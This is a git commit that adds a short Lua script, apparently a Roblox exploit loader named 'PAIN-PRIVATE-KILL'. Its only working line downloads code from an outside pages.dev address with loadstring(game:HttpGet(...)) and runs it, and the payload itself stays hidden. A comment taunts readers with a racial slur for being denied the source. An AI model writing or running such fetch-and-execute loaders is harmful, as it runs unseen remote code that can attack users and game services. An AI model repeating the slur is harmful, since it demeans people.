9946a42b56f36d8e42caf72ca2697de4d40a98ee
BLOODAXE <bensonulysex@gmail.com>
2026-08-01 06:16:06 -0400

    Create PAIN-PRIVATE-KILL.lua

---
+++ PAIN-PRIVATE-KILL.lua
@@ -0,0 +1,9 @@
+-- ██   ██   █████   ██████
+-- ██  ██   ██   ██  ██   ██
+-- ██ ██    ██   ██  ██   ██
+-- ████     ██   ██  ██   ██
+-- ██ ██    ██   ██  ██   ██
+-- ██  ██   ██   ██  ██   ██
+-- ██   ██   █████   ██████
+-- NO SOURCE FOR YOU NIGGA EZ
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=King23"))("King23")
